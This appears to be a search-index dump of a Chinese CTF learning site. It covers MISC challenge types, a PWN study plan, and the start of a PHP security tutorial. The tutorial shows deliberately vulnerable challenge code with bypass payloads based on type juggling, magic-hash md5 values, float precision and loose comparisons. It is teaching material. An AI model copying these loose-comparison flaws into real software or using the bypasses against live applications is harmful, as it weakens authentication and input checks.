</ul>"},{"location":"MISC/%E9%A2%98%E5%9E%8B/#_4","title":"\u97f3\u9891\u9690\u5199","text":"<ul> <li>\u9891\u8c31\u56fe</li> <li>\u5982\u679c\u6709\u660e\u663e\u7684\u58f0\u97f3\u53d8\u6362\uff0c\u53ef\u4ee5\u8003\u8651morse\u4e4b\u7c7b\u7684\u7f16\u7801   \u4e00\u822c\u5e38\u89c1\u7684\u662f\u5404\u79cd\u8f6f\u4ef6\u9690\u5199</li> <li>slientEye</li> <li>deepsound</li> <li>DTMF\u62e8\u53f7\u97f3</li> <li>SSTV</li> </ul>"},{"location":"MISC/%E9%A2%98%E5%9E%8B/#_5","title":"\u538b\u7f29\u5305","text":"<p>Note</p> <p>\u4e00\u822c\u538b\u7f29\u5305\u7206\u7834\u5bc6\u7801\u662fzip\u6bd4\u8f83\u591a \u7206\u7834\u7684\u65f6\u5019\u8bb0\u5f97\u5148\u5c1d\u8bd5\u7eaf\u6570\u5b57\uff0c\u6216\u8005\u5b58\u4e00\u5957\u8d81\u624b\u7684\u5b57\u5178</p>"},{"location":"MISC/%E9%A2%98%E5%9E%8B/#zip","title":"zip","text":"<ul> <li> <p>\u538b\u7f29\u5305\u4fee\u590d</p> </li> <li> <p>\u4f2a\u52a0\u5bc6</p> </li> <li> <p>\u5bc6\u7801\u672a\u77e5</p> </li> <li> <p>\u770b\u770b\u662f\u5426\u5728\u5176\u4ed6\u90e8\u5206\u80fd\u627e\u5230\u5bc6\u7801</p> </li> <li> <p>\u7206\u7834\u5bc6\u7801</p> </li> <li> <p>\u660e\u6587\u653b\u51fb</p> </li> <li> <p>\u63a9\u7801\u653b\u51fb</p> </li> <li> <p>crc\u653b\u51fb\uff08\u4e00\u822c\u662f\u6587\u4ef6\u5927\u5c0f\u5c0f\u4e8e\u7b49\u4e8e6\u5b57\u8282\uff09</p> </li> </ul>"},{"location":"MISC/%E9%A2%98%E5%9E%8B/#rar","title":"rar","text":"<ul> <li>\u4f2a\u52a0\u5bc6</li> <li>\u9690\u85cf\u6587\u4ef6</li> <li>NTFS\u6d41\u9690\u5199</li> </ul>"},{"location":"MISC/%E9%A2%98%E5%9E%8B/#_6","title":"\u6d41\u91cf\u5206\u6790","text":"<p>Note</p> <p>\u6d41\u91cf\u5206\u6790\u771f\u7684\u8003\u79ef\u7d2f\uff0c\u591a\u5237\u9898 \u8fd9\u4e24\u5e74\u8003\u7684\u6700\u591a\u7684\u7b80\u5355\u9898\u5c31\u662f\u8681\u5251\u6d41\u91cf\uff0c\u626b\u76ee\u5f55\u6d41\u91cf\uff0c\u5404\u79cd\u5165\u4fb5\u6d41\u91cf</p>"},{"location":"MISC/%E9%A2%98%E5%9E%8B/#_7","title":"\u534f\u8bae","text":"<ul> <li>TCP</li> <li>DNS\uff08DNS tunnel\uff09</li> <li>UDP</li> <li>USB\u6d41\u91cf</li> <li>\u9f20\u6807</li> <li>\u952e\u76d8</li> <li>\u5176\u4ed6\u7684\u6bd4\u5982\u624b\u67c4\u6d41\u91cf</li> <li>\u84dd\u7259\u534f\u8bae</li> </ul>"},{"location":"MISC/%E9%A2%98%E5%9E%8B/#_8","title":"\u4e8c\u7ef4\u7801","text":""},{"location":"MISC/%E9%A2%98%E5%9E%8B/#qrcode","title":"QRCode","text":"<p>Note</p> <p> \u8fd9\u662f\u6700\u5e38\u89c1\u7684\u4e8c\u7ef4\u7801 (Quick Response Code) \u5feb\u901f\u54cd\u5e94\u7801 \u5efa\u8bae\u53bb\u5b66\u4e00\u4e0bQRcode\u7684\u7ed3\u6784</p> <ul> <li>\u8865\u5b9a\u4f4d\u7801</li> <li>\u53cd\u8272</li> <li>\u635f\u574f\u4e8c\u7ef4\u7801\u7684\u4fee\u590d</li> <li>\u7ea0\u9519\u7801</li> </ul> <p>\u4e8c\u7ef4\u7801 \u663e\u800c\u6613\u89c1  \u53ea\u8981\u6709\u4e24\u4e2a\u6a2a\u8f74\u548c\u7eb5\u8f74\u90fd\u53ef\u4ee5\u53eb\u4e8c\u7ef4</p> <p>\u6240\u4ee5\u4e0d\u6b62\u6709qrcode</p> <ul> <li>\u5176\u4ed6\u4e8c\u7ef4\u7801(\u4e3e\u51e0\u4e2a\u4f8b\u5b50)</li> <li>PDF417</li> <li>Aztec Code</li> <li>DotCode</li> <li>MaxiCode</li> </ul>"},{"location":"MISC/%E9%A2%98%E5%9E%8B/#_9","title":"\u5185\u5b58\u53d6\u8bc1","text":"<p>\u5185\u5b58\u53d6\u8bc1\u662f\u4ec0\u4e48</p> <p>\u901a\u5e38\u6307\u5bf9\u8ba1\u7b97\u673a\u4e2d\u4e34\u65f6\u6570\u636e\u8fdb\u884c\u83b7\u53d6\u4e0e\u5206\u6790\uff0c\u63d0\u53d6\u6709\u4ef7\u503c\u7684\u6570\u636e\uff0c\u8fbe\u5230\u60f3\u8981\u8fbe\u5230\u7684\u76ee\u7684\u3002 \u8fd9\u662f\u4e2a\u5927\u9879\uff0c\u5b66\u8d77\u6765\u633a\u590d\u6742\u7684 \u4e5f\u662f\u9700\u8981\u591a\u7ec3\uff0c\u62ff\u5230\u4e00\u9053\u9898\u4e0d\u80fd\u65e0\u4ece\u4e0b\u624b</p>"},{"location":"MISC/%E9%A2%98%E5%9E%8B/#_10","title":"\u5e38\u7528\u7684\u5de5\u5177","text":"<ul> <li> <p>volatility</p> </li> <li> <p>FTK imager</p> </li> <li> <p>DiskGenius</p> </li> <li>VeraCrypt</li> <li>BitLocker</li> </ul>"},{"location":"MISC/%E9%A2%98%E5%9E%8B/#_11","title":"\u5e38\u89c1\u7684\u6587\u4ef6\u683c\u5f0f","text":"<ul> <li>.img</li> <li>.E01</li> <li>.vmdk</li> <li>.iso</li> </ul>"},{"location":"NWST/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/","title":"\u5185\u7f51\u6e17\u900f\u5b66\u4e60\u603b\u7ed3","text":"<p> \u7ea6 0 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4\u4e0d\u5230 1 \u5206\u949f</p>"},{"location":"PWN/pwn%E6%96%B9%E5%90%91%E5%AF%92%E5%81%87%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/","title":"PWN\u65b9\u5411\u5bd2\u5047\u5b66\u4e60\u8ba1\u5212","text":""},{"location":"PWN/pwn%E6%96%B9%E5%90%91%E5%AF%92%E5%81%87%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/#_1","title":"\u5199\u5468\u62a5\u7684\u8f6f\u4ef6\uff1a","text":""},{"location":"PWN/pwn%E6%96%B9%E5%90%91%E5%AF%92%E5%81%87%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/#_2","title":"\u77f3\u58a8\u6587\u6863\uff0c\u8bed\u96c0\uff0c\u98de\u4e66\uff08\u7f51\u9875\u7248\u4e5f\u53ef\uff09","text":"<p>https://shimo.im/</p> <p>https://yuque.com/</p> <p>https://www.feishu.cn/</p>"},{"location":"PWN/pwn%E6%96%B9%E5%90%91%E5%AF%92%E5%81%87%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/#_3","title":"\u5468\u62a5\uff1a","text":"<ol> <li>\u6821\u8d5b\u7684\u5468\u62a5\u7b97\u662f\u7b2c\u4e00\u6b21</li> <li>\u4e4b\u540e\u7684\u5468\u62a5\u4ee5\u672c\u5468\u5b66\u4e60\u7684\u77e5\u8bc6 \u4ee5\u53ca\u5b66\u4e60\u8def\u7ebf\u91cc\u9762\u7684\u4f8b\u9898wp\u4e3a\u4e3b\uff0c\u53ef\u4ee5\u518d\u52a0\u4e00\u4e9b\u53c2\u52a0\u6bd4\u8d5b\u9898wp\u548c\u7ec3\u4e60\u5e73\u53f0\u9898\u76eewp\u8fdb\u884c\u5206\u4eab</li> <li>\u53ef\u4ee5\u628a\u8fd9\u5468\u9047\u5230\u7684\u95ee\u9898\u5199\u5728\u5468\u62a5\u91cc\uff0c\u6700\u597d\u662f\u52a0\u4e0a\u81ea\u5df1\u7684\u89e3\u51b3\u65b9\u6cd5\uff0c\uff08\u627e\u4e0d\u5230\u89e3\u51b3\u65b9\u6cd5\u7684\u53ef\u4ee5\u95ee\u5b66\u957f\u4eec\uff09\u3010\u5468\u5929\u7684\u4f8b\u4f1a\u5b66\u957f\u4f1a\u7edf\u4e00\u8bb2\u4e00\u4e0b\u5468\u62a5\u91cc\u9762\u7684\u95ee\u9898\u3011</li> </ol>"},{"location":"PWN/pwn%E6%96%B9%E5%90%91%E5%AF%92%E5%81%87%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/#_4","title":"\u5206\u4eab\uff1a","text":"<p>\u6bcf\u5468\u6211\u4eec\u4f1a\u627e\u4e09\u4eba\u6216\u8005\u56db\u4eba\u8fdb\u884c\u5206\u4eab\uff0c\u6bcf\u4e2a\u4eba\u5206\u4eab\u65f6\u95f4\u4e0d\u4f4e\u4e8e20\u5206\u949f\u3002\uff08\u6709\u60f3\u5206\u4eab\u7684\u53ef\u4ee5\u63d0\u524d\u7ed9\u5b66\u957f\u8bf4\uff09</p>"},{"location":"PWN/pwn%E6%96%B9%E5%90%91%E5%AF%92%E5%81%87%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/#_5","title":"\u5b66\u4e60\u5efa\u8bae","text":"<p> \u7ea6 580 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 2 \u5206\u949f</p> <p>\u57fa\u7840\uff1a</p> <ul> <li>C\u8bed\u8a00</li> <li>python</li> <li>\u6c47\u7f16</li> <li>linux\u6307\u4ee4</li> <li>pwntools</li> <li>gdb\u8c03\u8bd5</li> <li>IDA\u4f7f\u7528</li> <li>elf\u6587\u4ef6\u7ed3\u6784</li> <li>\u51fd\u6570\u8c03\u7528\u6808\u673a\u5236</li> <li>\u5bc4\u5b58\u5668\u76f8\u5173\u77e5\u8bc6</li> <li>\u8f6f\u4ef6\u4fdd\u62a4\u673a\u5236</li> </ul>"},{"location":"PWN/pwn%E6%96%B9%E5%90%91%E5%AF%92%E5%81%87%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/#c","title":"C\u8bed\u8a00","text":"<p>mooc\u4e0a\u7fc1\u607a\u8001\u5e08\u7684\u8bfe</p> <p>\u7a0b\u5e8f\u8bbe\u8ba1\u5165\u95e8\u2014\u2014C\u8bed\u8a00_\u6d59\u6c5f\u5927\u5b66_\u4e2d\u56fd\u5927\u5b66MOOC(\u6155\u8bfe) (icourse163.org)</p> <p>C\u8bed\u8a00\u662f\u57fa\u7840\uff0c\u9700\u8981\u7740\u91cd\u5b66\u4e60\u3002</p>"},{"location":"PWN/pwn%E6%96%B9%E5%90%91%E5%AF%92%E5%81%87%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/#python","title":"\u5b66\u4e60python","text":"<p>\u4e2d\u56fd\u5927\u5b66\u6155\u8bfe\u4e0a\u7684\u5317\u7406\u5de5\u7684\u8bfe\u7a0b</p> <p>https://www.icourse163.org/course/BIT-268001?from=searchPage&amp;outVendor=zw_mooc_pcssjg_#/info</p> <p>\u53ea\u9700\u8981\u7740\u91cd\u5b66\u4e60python\u8bed\u6cd5\u5373\u53ef</p>"},{"location":"PWN/pwn%E6%96%B9%E5%90%91%E5%AF%92%E5%81%87%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/#_6","title":"\u6c47\u7f16","text":"<p>https://blog.csdn.net/ssihc0/article/details/5215044</p> <p>\u53ea\u9700\u8981\u4e86\u89e3\u4e00\u4e9b\u5e38\u7528\u6307\u4ee4\u5373\u53ef</p>"},{"location":"PWN/pwn%E6%96%B9%E5%90%91%E5%AF%92%E5%81%87%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/#ctfwiki-b","title":"\u4ee5ctfwiki\uff0c\u8bed\u96c0\u6216\u8005 B\u7ad9\u661f\u76df\u5b89\u5168\u6216\u8005 \u56fd\u8d44\u793e\u755c\u4e3a\u4e3b\u8def\u7ebf\u5b66\u4e60\u5373\u53ef","text":"<ul> <li>\u8bed\u96c0\uff1ahttps://www.yuque.com/hxfqg9/bin/yxegb6</li> <li>ctfwiki\uff1ahttps://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/stack-intro/</li> <li>B\u7ad9\u661f\u76df\u5b89\u5168\uff1a\u3010\u661f\u76df\u5b89\u5168\u3011pwn\u516c\u5f00\u8bfe</li> <li>B\u7ad9\u56fd\u8d44\u793e\u755c\uff1a\u4f60\u60f3\u6709\u591aPWN \u8fd9\u56db\u4e2a\u7684\u77e5\u8bc6\u90fd\u662f\u5927\u5dee\u4e0d\u5dee\u7684\uff0c\u53ef\u4ee5\u540c\u65f6\u89c2\u770b\uff0c\u9009\u62e9\u4e00\u4e2a\u4e3a\u4e3b\u5269\u4e0b\u7684\u4e09\u4e2a\u4f5c\u4e3a\u8865\u5145\uff0c\u5efa\u8bae\u4ee5\u6587\u6863\u4e3a\u4e3b\uff0c\u89c6\u9891\u4f5c\u4e3a\u8865\u5145 \u5b66\u4e60\u6548\u7387\u6bd4\u8f83\u9ad8\u4e9b\uff08\u4e5f\u53ef\u4ee5\u81ea\u5df1\u627e\u4e00\u4e9b\u9002\u5408\u81ea\u5df1\u7684\u8bfe\u7a0b\u6216\u8005\u6587\u6863\uff09</li> </ul>"},{"location":"PWN/pwn%E6%96%B9%E5%90%91%E5%AF%92%E5%81%87%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/#_7","title":"\u5237\u9898\u7f51\u7ad9","text":"<ul> <li>buu   \uff1ahttps://buuoj.cn</li> <li>\u653b\u9632\u4e16\u754c  https://adworld.xctf.org.cn</li> <li>ctfshow\uff1ahttps://ctf.show</li> </ul>"},{"location":"PWN/pwn%E6%96%B9%E5%90%91%E5%AF%92%E5%81%87%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/#_8","title":"\u6700\u540e","text":"<ul> <li>\u9047\u5230\u95ee\u9898\u8981\u591a\u767e\u5ea6\uff0c\u591a\u95ee\u5b66\u957f\u5b66\u59d0\u4eec\u3002\u3010\u5c3d\u91cf\u627e\u7fa4\u91cc21\u7ea7\u5b66\u957f\u5b66\u59d0\u3011</li> <li>pwn\u65b9\u5411\u5165\u95e8\u662f\u6bd4\u8f83\u96be\u7684\uff0c\u8981\u6709\u4fe1\u5fc3\u575a\u6301\u4e0b\u53bb\uff0c\u6211\u4eec\u65b9\u5411\u5bd2\u5047\u5168\u90e8\u662f\u4ee5\u57fa\u7840\u77e5\u8bc6\u7684\u5b66\u4e60\u4e3a\u4e3b\uff0c\u81ea\u5df1\u5199\u7684\u5468\u62a5\u53ef\u4ee5\u4f5c\u4e3a\u65e5\u540e\u7684\u8d44\u6599\u4f7f\u7528\uff08\u8981\u8ba4\u771f\u5199\uff09\uff0c\u611f\u89c9\u5199\u7684\u597d\u7684\u5468\u62a5\u53ef\u4ee5\u53d1\u4e00\u4e9b\u535a\u5ba2\u4fdd\u5b58\u8d77\u6765\u3002</li> </ul>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-PHP%E7%AF%87/","title":"PHP\u4ee3\u7801\u5b89\u5168","text":"<p> \u7ea6 4715 \u4e2a\u5b57  660 \u884c\u4ee3\u7801  16 \u5f20\u56fe\u7247  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 24 \u5206\u949f</p> <p>PHP\u76f8\u5173\u9898\u76ee\u4e00\u822c\u662fCTF\u7ade\u8d5b\u4e2dWeb\u7c7b\u9898\u76ee\u8003\u5bdf\u6700\u591a\u7684\uff0cPHP\u8bed\u8a00\u5177\u6709\u5f88\u591a\u7279\u6027\uff0c\u8fd9\u4e9b\u7279\u6027\u901a\u5e38\u4f1a\u9020\u6210\u9884\u6599\u4e4b\u5916\u7684\u5b89\u5168\u95ee\u9898\uff0c\u4e5f\u662f\u5f88\u591aCTF\u7ade\u8d5b\u8003\u67e5\u7684\u77e5\u8bc6\u70b9\u3002</p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-PHP%E7%AF%87/#_1","title":"\u4e00\u3001\u6d6e\u70b9\u6570\u7cbe\u5ea6\u95ee\u9898","text":""},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-PHP%E7%AF%87/#_2","title":"\u7406\u8bba\u77e5\u8bc6","text":"<p>\u5728\u7528PHP\u8fdb\u884c\u6d6e\u70b9\u6570\u7684\u8fd0\u7b97\u4e2d,\u7ecf\u5e38\u4f1a\u51fa\u73b0\u4e00\u4e9b\u548c\u9884\u671f\u7ed3\u679c\u4e0d\u4e00\u6837\u7684\u503c\uff0c\u8fd9\u662f\u7531\u4e8e\u6d6e\u70b9\u6570\u7684\u7cbe\u5ea6\u6709\u9650\u3002\u5c3d\u7ba1\u53d6\u51b3\u4e8e\u7cfb\u7edf\uff0cPHP \u901a\u5e38\u4f7f\u7528 IEEE 754 \u53cc\u7cbe\u5ea6\u683c\u5f0f\uff0c\u5219\u7531\u4e8e\u53d6\u6574\u800c\u5bfc\u81f4\u7684\u6700\u5927\u76f8\u5bf9\u8bef\u5dee\u4e3a 1.11e-16\u3002\u975e\u57fa\u672c\u6570\u5b66\u8fd0\u7b97\u53ef\u80fd\u4f1a\u7ed9\u51fa\u66f4\u5927\u8bef\u5dee\uff0c\u5e76\u4e14\u8981\u8003\u8651\u5230\u8fdb\u884c\u590d\u5408\u8fd0\u7b97\u65f6\u7684\u8bef\u5dee\u4f20\u9012\u3002  \u4ee5\u5341\u8fdb\u5236\u80fd\u591f\u7cbe\u786e\u8868\u793a\u7684\u6709\u7406\u6570\u5982 0.1 \u6216 0.7\uff0c\u65e0\u8bba\u6709\u591a\u5c11\u5c3e\u6570\u90fd\u4e0d\u80fd\u88ab\u5185\u90e8\u6240\u4f7f\u7528\u7684\u4e8c\u8fdb\u5236\u7cbe\u786e\u8868\u793a\uff0c\u56e0\u6b64\u4e0d\u80fd\u5728\u4e0d\u4e22\u5931\u4e00\u70b9\u70b9\u7cbe\u5ea6\u7684\u60c5\u51b5\u4e0b\u8f6c\u6362\u4e3a\u4e8c\u8fdb\u5236\u7684\u683c\u5f0f\u3002\u8fd9\u5c31\u4f1a\u9020\u6210\u6df7\u4e71\u7684\u7ed3\u679c\uff1a\u4f8b\u5982\uff0cfloor((0.1+0.7)*10) \u901a\u5e38\u4f1a\u8fd4\u56de 7 \u800c\u4e0d\u662f\u9884\u671f\u4e2d\u7684 8\uff0c\u56e0\u4e3a\u8be5\u7ed3\u679c\u5185\u90e8\u7684\u8868\u793a\u5176\u5b9e\u662f\u7c7b\u4f3c 7.9999999999999991118\u2026\u3002</p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-PHP%E7%AF%87/#_3","title":"\u4f8b\u5b50","text":""},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-PHP%E7%AF%87/#_4","title":"\u9898\u76ee\u4ee3\u7801","text":"<pre><code>&lt;?php\n    if($_GET['num']&lt;&gt;\"\"){\n        $num = $_GET['num'];\n        if(strstr($num,'1')){\n            die(\"Sorry\");\n        }elseif($num &lt;&gt; 1){\n            echo \"Try to num = 1\";\n        }\n        if($num == 1 ){\n            echo 'flag{xxxxxxxx}';\n        }\n    }\n</code></pre>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-PHP%E7%AF%87/#payload","title":"payload","text":"<p>num=0.9999999999999999999999999999999999999999999999</p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-PHP%E7%AF%87/#_5","title":"\u4e8c\u3001\u7c7b\u578b\u8f6c\u6362\u95ee\u9898","text":""},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-PHP%E7%AF%87/#_6","title":"\u7406\u8bba\u77e5\u8bc6","text":""},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-PHP%E7%AF%87/#_7","title":"\u5e38\u89c1\u8f6c\u6362","text":"<p>\u5e38\u89c1\u7684\u8f6c\u6362\u4e3b\u8981\u5c31\u662fint\u8f6c\u6362\u4e3astring\uff0cstring\u8f6c\u6362\u4e3aint\u3002 \u8f6c\u6362\u65b9\u5f0f\uff1a <pre><code>$var = 5;\n\u65b9\u5f0f1\uff1a$item = (string)$var;\n\u65b9\u5f0f2\uff1a$item = strval($var);\n</code></pre> \u5e38\u89c1\u7684PHP\u6570\u5b66\u8fd0\u7b97\uff1a <pre><code>&lt;?php\nvar_dump(0 == '0'); // true\nvar_dump(0 == 'abcdefg'); // true\nvar_dump(0 === 'abcdefg'); // false\nvar_dump(1 == '1abcdef'); // true\nvar_dump(intval('3389a'));//\u8f93\u51fa3389\n</code></pre> \u5f53\u6709\u4e00\u4e2a\u6bd4\u8f83\u53c2\u6570\u662f\u6574\u6570\u7684\u65f6\u5019\uff0c\u4f1a\u628a\u53e6\u4e00\u4e2a\u53c2\u6570\u5f3a\u5236\u8f6c\u6362\u4e3a\u6574\u6570\u3002</p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-PHP%E7%AF%87/#0e","title":"0e\u8f6c\u6362\u95ee\u9898","text":"<p>\u5728\u677e\u6563\u6a21\u5f0f\u7684\u6bd4\u8f83\u4e0b\uff0cPHP\u4f1a\u5c060e\u8fd9\u7c7b\u5b57\u7b26\u4e32\u8bc6\u4e3a\u79d1\u5b66\u6280\u672f\u6cd5\u8868\u793a\u7684\u6570\u5b57\u3002 \u901a\u5e38\u4f1a\u4ee5md5()\u4f5c\u4e3a\u8003\u8003\u67e5\u3002 \u5b57\u7b26\u4e32\u52a0\u5bc6\u540emd5\u4e3a0exxxx\u7684\u5b57\u7b26\u4e32(x\u5fc5\u987b\u662f10\u8fdb\u5236\u6570\u5b57)\u5217\u8868</p> \u5b57\u7b26\u4e32 md5 QNKCDZO 0e830400451993494058024219903391 240610708 0e462097431906509019562988736854 aabg7XSs 0e087386482136013740957780965295 aabC9RqS 0e041022518165728065344349536299 s878926199a 0e545993274517709034328855841020"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-PHP%E7%AF%87/#1","title":"\u4f8b\u5b50\uff081\uff09","text":""},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-PHP%E7%AF%87/#_8","title":"\u9898\u76ee\u4ee3\u7801","text":"<pre><code>&lt;?php\n    error_reporting(0);\n    $flag = 'flag{1S_numer1c_Not_S4fe}';\n    $id = $_GET['id'];\n    is_numeric($id)?die(\"Sorry....\"):NULL;    \n    if($id&gt;665){\n        echo $flag;\n    } \n?&gt;\n</code></pre>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-PHP%E7%AF%87/#payload_1","title":"payload","text":"<p>id=666a</p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-PHP%E7%AF%87/#2","title":"\u4f8b\u5b50\uff082\uff09","text":""},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-PHP%E7%AF%87/#_9","title":"\u9898\u76ee\u4ee3\u7801","text":"<pre><code>&lt;?php\n    $md5_1 = md5('QNKCDZO');\n    $a = @$_GET['a'];\n    $md5_2 = @md5($a);\n    if(isset($a)){\n        if ($a != 'QNKCDZO' &amp;&amp; $md5_1 == $md5_2) {\n            echo \"flag{*****************}\";\n        } else {\n            echo \"false!!!\";\n        }\n    }\n    else{\n        echo \"please input a\";\n    }\n?&gt;\n</code></pre>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-PHP%E7%AF%87/#payload_2","title":"payload","text":"<p>a=240610708</p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-PHP%E7%AF%87/#_10","title":"\u4e09\u3001\u677e\u6563\u5224\u65ad\u95ee\u9898","text":""},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-PHP%E7%AF%87/#_11","title":"\u7406\u8bba\u77e5\u8bc6","text":""},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-PHP%E7%AF%87/#1_1","title":"1. \u53d8\u91cf\u7684\u677e\u6563\u6bd4\u8f83\u95ee\u9898","text":"<p>php\u6bd4\u8f83\u76f8\u7b49\u6027\u7684\u8fd0\u7b97\u7b26\u6709\u4e24\u79cd\uff0c\u4e00\u79cd\u662f\u4e25\u683c\u6bd4\u8f83 ===\uff0c\u53e6\u4e00\u79cd\u662f\u677e\u6563\u6bd4\u8f83 ==\u3002 PHP \u4f1a\u6839\u636e\u53d8\u91cf\u7684\u503c\uff0c\u81ea\u52a8\u628a\u53d8\u91cf\u8f6c\u6362\u4e3a\u6b63\u786e\u7684\u6570\u636e\u7c7b\u578b\u3002  </p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-PHP%E7%AF%87/#2_1","title":"2. \u6570\u7ec4\u7684\u677e\u6563\u95ee\u9898","text":"<p><pre><code>&lt;?php\n$c = $_GET['c'];\n$a = $_GET['a'];\nif(!strcmp($c[1],$a) &amp;&amp; $c[1]!==$a){\n    echo 'flag{***********}';\n}    \n</code></pre> \u53ef\u4ee5\u53d1\u73b0\uff0c\u8fd9\u4e2a\u5206\u652f\u901a\u8fc7strcmp\u51fd\u6570\u6bd4\u8f83\uff0c\u8981\u6c42\u4e24\u8005\u76f8\u7b49\uff0c\u4e14==\u8981\u6c42\u4e24\u8005\u4e0d\u76f8\u7b49\u624d\u80fdgetflag\u3002 \u8fd9\u91cc\u7684strcmp\u51fd\u6570\u5b9e\u9645\u4e0a\u662f\u5c06\u4e24\u4e2a\u53d8\u91cf\u8f6c\u6362\u6210ascii\u7136\u540e\u505a\u6570\u5b66\u51cf\u6cd5\uff0c\u8fd4\u56de\u4e00\u4e2aint\u7684\u5dee\u503c\u3002 </p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-PHP%E7%AF%87/#3","title":"3. \u8bed\u53e5\u6761\u4ef6\u7684\u677e\u6563\u5224\u65ad\u95ee\u9898","text":"<p>PHP\u7684switch()\u4f7f\u7528\u4e86\u677e\u6563\u6bd4\u8f83\u3002 $which\u4f1a\u88ab\u81ea\u52a8\u52a8intval()\uff0c\u5982\u679c\u6bcf\u4e2acase()\u90fd\u6ca1\u6709break\uff0c\u5c31\u4f1a\u4e00\u76f4\u6267\u884c\u5230\u5305\u542b\u7684\u8bed\u53e5\u3002 <pre><code>&lt;?php \nif (isset($_GET['which'])) {\n    $which = $_GET['which'];\n        switch ($which)      \n{      \n    case 0:      \n    case 1:      \n    case 2:             \nshow_source( $which.'.php' );              \nbreak;      \ndefault:              \necho GWF_HTML::error('PHP-0817', 'Hacker NoNoNo!', false);              \nbreak;  \n    } \n} \n?&gt; \n</code></pre> </p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-PHP%E7%AF%87/#4","title":"4. \u51fd\u6570\u7684\u677e\u6563\u5224\u65ad\u95ee\u9898","text":"<p><code>var_dump(in_array(\"abc\", $array));</code> <code>in_array()</code>\u662fPHP\u5f53\u4e2d\u7ecf\u5e38\u4f7f\u7528\u7684\u51fd\u6570\uff0c\u7528\u4e8e\u68c0\u67e5\u6570\u7ec4\u4e2d\u662f\u5426\u5b58\u5728\u67d0\u4e2a\u503c\u3002\u9ed8\u8ba4\u662f\u4f7f\u7528\u677e\u6563\u6a21\u5f0f\u904d\u5386\u6570\u7ec4\uff0c\u8fdb\u884c\u6bd4\u8f83\u3002\u677e\u6563\u6a21\u5f0f\uff0c\u5b58\u5728\u4e00\u5b9a\u7684\u5b89\u5168\u95ee\u9898\u3002 